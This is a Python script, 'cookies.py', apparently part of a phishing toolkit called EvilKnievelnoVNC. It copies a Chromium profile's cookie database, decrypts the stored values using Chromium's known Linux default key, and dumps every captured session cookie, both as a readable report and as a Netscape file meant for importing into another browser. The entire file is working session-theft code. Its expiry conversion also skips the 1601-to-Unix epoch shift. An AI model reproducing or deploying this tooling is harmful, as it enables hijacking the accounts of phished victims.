#!/usr/bin/env python3
"""
cookies.py — Chrome/Chromium cookie extractor for EvilKnievelnoVNC

Bug fixes vs original:
  1. text_factory REMOVED — original decoded ALL columns (including binary
     encrypted_value blobs) as UTF-8, corrupting AES ciphertext before
     decryption.  Now binary BLOBs stay as bytes.
  2. WAL checkpoint — Chromium uses SQLite WAL mode. Connecting to the live
     DB only reads checkpointed data; recent cookie writes sitting in the WAL
     buffer are missed.  Fix: copy DB + WAL + SHM to a temp dir first, which
     forces a checkpoint when we open the copy.
  3. Graceful exit when Cookies file does not exist yet (Chromium hasn't
     started browsing; the calling loop in server.sh will retry in 10 s).

Outputs:
  stdout        → human-readable dump (redirected to Downloads/cookies.txt)
  OUT_NETSCAPE  → Netscape HTTP Cookie File (import via any cookie editor)
"""

import os
import sys
import sqlite3
import shutil
import tempfile
from datetime import datetime, timedelta

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

CHROME_PROFILE = "/home/user/Chrome/Default"
COOKIES_DB     = os.path.join(CHROME_PROFILE, "Cookies")
OUT_NETSCAPE   = "/home/user/Downloads/cookies-netscape.txt"


def chrome_time(ts):
    """Convert Chrome microsecond timestamp (epoch 1601-01-01) to string."""
    if ts and ts != 86400000000:
        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=ts))
        except Exception:
            pass
    return ""


def decrypt(enc):
    """
    Decrypt AES-CBC v10 Chromium cookie value.
    On Linux without GNOME keyring Chromium uses:
      password = 'peanuts', salt = 'saltysalt', iterations = 1, keylen = 16
    """
    if not HAS_CRYPTO:
        return "[pycryptodome not installed]"
    if not isinstance(enc, (bytes, bytearray)) or len(enc) < 4:
        return ""
    try:
        if enc[:3] == b'v10':
            enc = enc[3:]
            key    = PBKDF2(b'peanuts', b'saltysalt', 16, 1)
            cipher = AES.new(key, AES.MODE_CBC, b' ' * 16)
            raw    = cipher.decrypt(enc)
            # Remove PKCS7 padding
            pad = raw[-1]
            if 1 <= pad <= 16:
                return raw[:-pad].decode('utf-8', errors='replace')
    except Exception as e:
        return f"[decrypt error: {e}]"
    return enc.decode('utf-8', errors='replace')


def copy_db(src):
    """
    Copy a SQLite database + its WAL and SHM sidecar files to a temp dir.
    Opening the copy forces a WAL checkpoint so we see all committed data.
    Returns path to the temp DB file.  Caller is responsible for cleanup.
    """
    tmp = tempfile.mkdtemp(prefix="ekv_cookies_")
    dst = os.path.join(tmp, "Cookies")
    shutil.copy2(src, dst)
    for ext in ("-wal", "-shm"):
        sidecar = src + ext
        if os.path.exists(sidecar):
            shutil.copy2(sidecar, dst + ext)
    return tmp, dst


def main():
    if not os.path.exists(COOKIES_DB):
        print("[!] Cookies DB not found yet — Chromium may not have browsed any sites")
        sys.exit(0)

    tmp_dir = None
    try:
        tmp_dir, tmp_db = copy_db(COOKIES_DB)

        # DO NOT set text_factory — BLOB columns must remain as bytes
        db = sqlite3.connect(tmp_db)
        cursor = db.cursor()
        cursor.execute("""
            SELECT host_key, name, value,
                   creation_utc, last_access_utc, expires_utc,
                   encrypted_value, is_secure, is_httponly, path
            FROM cookies
        """)
        rows = cursor.fetchall()
        db.close()

    except Exception as e:
        print(f"[!] SQLite error: {e}")
        sys.exit(1)
    finally:
        if tmp_dir:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    readable = [
        f"[*] EvilKnievelnoVNC — Cookie Dump — {now}",
        f"[*] Total cookies captured: {len(rows)}",
        "=" * 70,
    ]
    netscape = [
        "# Netscape HTTP Cookie File",
        "# Captured by EvilKnievelnoVNC",
        "# Import via: Cookie-Editor (browser extension) or curl --cookie-jar",
        "",
    ]

    for (host_key, name, value,
         created, last_access, expires,
         enc_val, is_secure, is_httponly, path) in rows:

        # Plaintext value takes priority; otherwise decrypt the blob
        if value:
            decrypted = value
        elif isinstance(enc_val, (bytes, bytearray)) and len(enc_val) > 3:
            decrypted = decrypt(enc_val)
        else:
            decrypted = str(enc_val or "")

        readable += [
            f"Host:     {host_key}",
            f"Name:     {name}",
            f"Value:    {decrypted}",
            f"Path:     {path}",
            f"Secure:   {bool(is_secure)}   HttpOnly: {bool(is_httponly)}",
            f"Created:  {chrome_time(created)}",
            f"Expires:  {chrome_time(expires)}",
            "-" * 70,
        ]

        # Netscape format: domain  include_sub  path  secure  expiry  name  value
        include_sub = "TRUE" if host_key.startswith(".") else "FALSE"
        secure_str  = "TRUE" if is_secure else "FALSE"
        # Convert Chrome microsecond timestamp to Unix epoch seconds
        expiry = (expires // 1_000_000) if expires else 2_147_483_647
        if expiry <= 0:
            expiry = 2_147_483_647
        netscape.append(
            f"{host_key}\t{include_sub}\t{path}\t{secure_str}\t{expiry}\t{name}\t{decrypted}"
        )

    # stdout → redirected to Downloads/cookies.txt by caller (server.sh)
    print("\n".join(readable))

    # Write Netscape format to a separate file for easy browser import
    try:
        with open(OUT_NETSCAPE, "w", encoding="utf-8") as f:
            f.write("\n".join(netscape) + "\n")
    except Exception as e:
        print(f"[!] Failed to write Netscape file: {e}", file=sys.stderr)


if __name__ == "__main__":
    main()
